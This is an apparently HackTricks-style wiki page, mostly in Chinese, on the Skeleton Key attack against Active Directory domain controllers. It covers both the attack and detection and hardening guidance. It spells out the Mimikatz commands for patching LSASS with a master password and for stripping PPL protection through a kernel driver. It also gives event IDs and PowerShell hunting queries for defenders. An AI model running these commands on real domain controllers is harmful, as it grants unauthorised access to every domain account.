# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

**Skeleton Key attack** 是一种通过向每个域控制器的 LSASS 进程中**注入主密码**，从而**绕过 Active Directory authentication** 的技术。注入后，主密码（默认值为 **`mimikatz`**）可用于以**任意域用户**身份进行 authentication，同时这些用户的真实密码仍然有效。<sup>[[1]](#references)[[2]](#references)</sup>

关键事实：

- 需要在每个 DC 上具备 **Domain Admin/SYSTEM + SeDebugPrivilege**，并且必须在**每次重启后重新应用**。<sup>[[2]](#references)</sup>
- 会修补 **NTLM** 和 **Kerberos RC4 (etype 0x17)** validation paths；仅使用 AES 的 realms 或强制使用 AES 的 accounts 将**无法接受 skeleton key**。<sup>[[2]](#references)</sup>
- 可能与第三方 LSA authentication packages 或其他 smart-card / MFA providers 发生冲突。<sup>[[2]](#references)</sup>
- Mimikatz module 接受可选 switch `/letaes`，用于避免修改 Kerberos/AES hooks，以应对兼容性问题。<sup>[[3]](#references)</sup>

### Execution

经典的、未受 PPL 保护的 LSASS：
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
如果 **LSASS 以 PPL 运行**（RunAsPPL/Credential Guard/Windows 11 Secure LSASS），则需要内核驱动程序先移除保护，然后才能 patch LSASS：<sup>[[3]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
注入后，使用任意 domain account 进行认证，但密码使用 `mimikatz`（或 operator 设置的值）。请记住，在 multi‑DC 环境中要在 **所有 DCs** 上重复执行。

## Mitigations

- **Log monitoring**
- System **Event ID 7045**（service/driver install），用于检测未签名的 drivers，例如 `mimidrv.sys`。
- **Sysmon**：Event ID 7（driver load），用于检测 `mimidrv.sys`；Event ID 10，用于检测来自非 system processes 对 `lsass.exe` 的可疑访问。
- Security **Event ID 4673/4611**，用于检测 sensitive privilege use 或 LSA authentication package registration 异常；将其与来自 DCs、使用 RC4（etype 0x17）的异常 4624 logons 进行关联。
- **Hardening LSASS**
- 在 DCs 上保持 **RunAsPPL/Credential Guard/Secure LSASS** 启用，迫使 attackers 使用 kernel‑mode driver deployment（提供更多 telemetry，且 exploitation 更困难）。
- 尽可能禁用 legacy **RC4**；仅限于 AES 的 Kerberos tickets 可阻止 skeleton key 使用的 RC4 hook path。<sup>[[2]](#references)</sup>
- Quick PowerShell hunts：
- Detect unsigned kernel driver installs：`Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Hunt for Mimikatz driver：`Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Validate PPL is enforced after reboot：`Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

如需其他 credential‑hardening 指南，请查看 [Windows credentials protections](../stealing-credentials/credentials-protections.md)。

## References

- [1] [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
